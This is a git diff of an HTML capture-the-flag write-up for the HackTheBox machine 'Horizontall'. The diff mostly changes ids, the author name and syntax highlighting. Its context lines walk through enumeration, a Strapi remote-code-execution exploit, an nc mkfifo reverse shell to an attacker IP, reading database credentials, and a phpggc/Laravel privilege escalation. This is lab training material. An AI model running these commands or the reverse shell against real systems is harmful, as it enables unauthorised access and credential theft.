@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Horizontall</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -49,12 +49,12 @@
 <li><a href="#orgca88872">2.1. Nmap</a></li>
 <li><a href="#org72525fd">2.2. Web enumeration</a>
 <ul>
-<li><a href="#org368743f">2.2.1. Gobuster</a></li>
+<li><a href="#orgca93db8">2.2.1. Gobuster</a></li>
 <li><a href="#orgb9f2a30">2.2.2. Zaproxy</a></li>
 <li><a href="#org2133d11">2.2.3. App.js</a></li>
 <li><a href="#orgd892a1a">2.2.4. api-prod.horizontall.htb</a>
 <ul>
-<li><a href="#org9e0a4ea">2.2.4.1. Gobuster</a></li>
+<li><a href="#org5858ed9">2.2.4.1. Gobuster</a></li>
 </ul>
 </li>
 </ul>
@@ -98,7 +98,7 @@ After this we can do some web enumeration on the web server running on port 80.<
 I split the scan up into two parts, as I initially wanted to go kinda stealthy on the machine.<br>
 This however went pretty quickly out the window.<br>
 </p>
-<pre class="example" id="org95152be">
+<pre class="example" id="orgedeb5db">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ nmap -p- 10.129.204.161 -oA nmap/syn_scan_all_ports                                          17:36
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-29 17:36 CEST
@@ -115,7 +115,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
 <p>
 After getting the open ports, I did a version scan and ran the default <code>nmap</code> scripts.<br>
 </p>
-<pre class="example" id="orgefc73b7">
+<pre class="example" id="org85d8a73">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ sudo nmap -sC -sV -p 22,80 -O -oA nmap/script_version 10.129.204.161                         17:38
 [sudo] password for c3lphie:
@@ -153,17 +153,17 @@ Here we get a hostname <code>horizontall.htb</code>, and the version of the web 
 <p>
 Let's add the hostname to <code>/etc/hosts</code>, before we start exploring the website.<br>
 </p>
-<pre class="example" id="org68559c6">
+<pre class="example" id="orgb81abef">
 [root@c3lphie-laptop horizontall]# echo "10.129.204.161    horizontall.htb" &gt;&gt; /etc/hosts
 </pre>
 </div>
-<div id="outline-container-org368743f" class="outline-4">
-<h4 id="org368743f"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
+<div id="outline-container-orgca93db8" class="outline-4">
+<h4 id="orgca93db8"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
 Before actually looking at the site, I started <code>gobuster</code>:<br>
 </p>
-<pre class="example" id="org289373c">
+<pre class="example" id="orgf668fbd">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ gobuster dir -u "http://horizontall.htb" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
 ===============================================================
@@ -202,7 +202,7 @@ I used <code>zaproxy</code>'s HUD, which is firefox with some extra stuff for at
 The site index, it is a pretty simple website for some new tech-startup.<br>
 </p>
 
-<figure id="orgab6f019">
+<figure id="orgc192d2b">
 <img src="assets/2021-08-29_17-58-08_screenshot.png" alt="2021-08-29_17-58-08_screenshot.png"><br>
 
 </figure>
@@ -211,7 +211,7 @@ The site index, it is a pretty simple website for some new tech-startup.<br>
 There is even a contact form that doesn't work.<br>
 </p>
 
-<figure id="org4a4be4e">
+<figure id="org880ab84">
 <img src="assets/2021-08-29_17-58-57_screenshot.png" alt="2021-08-29_17-58-57_screenshot.png"><br>
 
 </figure>
@@ -220,7 +220,7 @@ There is even a contact form that doesn't work.<br>
 It has been created in <code>vue.js</code>, but googling around for vulnerabilties won't give us much unfortunately.<br>
 </p>
 
-<figure id="org953d1e7">
+<figure id="org5e17fd4">
 <img src="assets/2021-08-29_18-12-54_screenshot.png" alt="2021-08-29_18-12-54_screenshot.png"><br>
 
 </figure>
@@ -234,21 +234,21 @@ There is a subdomain leaked in the file <code>app.js</code>:<br>
 </p>
 <div class="org-src-container">
 <label class="org-src-name"><span class="listing-number">Listing 1: </span>Subdomain leak in <code>app.js</code></label><pre class="src src-js">y = {
-    name: "App",
+    name: <span class="org-string">"App"</span>,
     components: {
 	Navbar: v,
 	Home: w
     },
-    data: function() {
-	return {
+    <span class="org-function-name">data</span>: <span class="org-keyword">function</span>() {
+	<span class="org-keyword">return</span> {
 	    reviews: []
 	}
     },
     methods: {
-	getReviews: function() {
-	    var t = this;
-	    r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
-		return t.reviews = s.data
+	<span class="org-function-name">getReviews</span>: <span class="org-keyword">function</span>() {
+	    <span class="org-keyword">var</span> <span class="org-variable-name">t</span> = <span class="org-constant">this</span>;
+	    r.a.get(<span class="org-string">"http://api-prod.horizontall.htb/reviews"</span>).then((<span class="org-keyword">function</span>(<span class="org-variable-name">s</span>) {
+		<span class="org-keyword">return</span> t.reviews = s.data
 	    }))
 	}
     }
@@ -264,13 +264,13 @@ Let's add this to <code>/etc/hosts</code>, and start poking a bit on that.<br>
 <h4 id="orgd892a1a"><span class="section-number-4">2.2.4.</span> api-prod.horizontall.htb</h4>
 <div class="outline-text-4" id="text-2-2-4">
 </div>
-<div id="outline-container-org9e0a4ea" class="outline-5">
-<h5 id="org9e0a4ea"><span class="section-number-5">2.2.4.1.</span> Gobuster</h5>
+<div id="outline-container-org5858ed9" class="outline-5">
+<h5 id="org5858ed9"><span class="section-number-5">2.2.4.1.</span> Gobuster</h5>
 <div class="outline-text-5" id="text-2-2-4-1">
 <p>
 Why don't we start off with <code>gobuster</code> on the new subdomain:<br>
 </p>
-<pre class="example" id="orgb407060">
+<pre class="example" id="orgcccf51e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ gobuster dir -u "http://api-prod.horizontall.htb/" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
 ===============================================================
@@ -308,7 +308,7 @@ Looks like we got some admin site, this could very well be our way in!<br>
 <p>
 If we look at the headers in the HTTP response:<br>
 </p>
-<pre class="example" id="orgf46fd0d">
+<pre class="example" id="org054299c">
 HTTP/1.1 200 OK
 Server: nginx/1.14.0 (Ubuntu)
 Date: Sun, 29 Aug 2021 17:15:54 GMT
@@ -336,7 +336,7 @@ Inorder to get the version of Strapi, go to following endpoint:<br>
 <p>
 This responds with the following JSON:<br>
 </p>
-<pre class="example" id="orgf008413">
+<pre class="example" id="orgd341197">
 {
   "data": {
     "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
@@ -368,7 +368,7 @@ This python script should give us foothold and user flag!<br>
 <p>
 Let's run the exploit script:<br>
 </p>
-<pre class="example" id="org76ed1a5">
+<pre class="example" id="org5788d02">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ /usr/bin/python script.py "http://api-prod.horizontall.htb"
 [+] Checking Strapi CMS Version running
@@ -388,14 +388,14 @@ $&gt;
 And we got a shell!<br>
 This shell was rather unstable so I opted for this reverse shell curtesy of <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:<br>
 </p>
-<pre class="example" id="org257b0aa">
+<pre class="example" id="org703c92c">
 $&gt; rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.47 4444 &gt;/tmp/f
 </pre>
 
 <p>
 And now we got proper access:<br>
 </p>
-<pre class="example" id="org49fbf2f">
+<pre class="example" id="org3b9170e">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ nc -lnvp 4444
 Connection from 10.129.176.172:41956
@@ -408,7 +408,7 @@ $
 <p>
 So let's go find our first flag!<br>
 </p>
-<pre class="example" id="org3b3a965">
+<pre class="example" id="org2a28955">
 $ cd home
 $ ls
 developer
@@ -424,7 +424,7 @@ $ cat user.txt
 <p>
 Looking around there are creds for the database in the <code>database.json</code> file in strapi's config folder.<br>
 </p>
-<pre class="example" id="org9648178">
+<pre class="example" id="org3980a43">
 $ cat database.json
 {
   "defaultConnection": "default",
@@ -471,7 +471,7 @@ I wanted to run <code>linPEAS.sh</code> on the box, so I created a quick python 
 <p>
 In <code>linPEAS.sh</code> output, there is something interesting under the active ports section:<br>
 </p>
-<pre class="example" id="org0a42646">
+<pre class="example" id="orgea790ad">
 [+] Active Ports
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
 Active Internet connections (servers and established)
@@ -520,7 +520,7 @@ I should preface this by saying this part is completly by memory because I forgo
 <p>
 I created an ssh key using:<br>
 </p>
-<pre class="example" id="orgc5f92fb">
+<pre class="example" id="org9663cb3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
 └─&gt; $ ssh-keygen -t rsa
 Generating public/private rsa key pair.
@@ -573,7 +573,7 @@ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruc
 <p>
 Which when run with the exploit gives us this output:<br>
 </p>
-<pre class="example" id="org1474199">
+<pre class="example" id="org4c5fba9">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall/www ]
 └─&gt; $ /usr/bin/python laravel.py http://127.0.0.1:8000 /tmp/exploit.phar
 + Log file: /home/developer/myproject/storage/logs/laravel.log
@@ -605,7 +605,7 @@ nc -lnvp 1337
 <p>
 And then run the exploit and get the flag:<br>
 </p>
-<pre class="example" id="org955b831">
+<pre class="example" id="orgb588242">
 Connection from 10.129.176.172:43028
 /bin/sh: 0: can't access tty; job control turned off
 # whoami
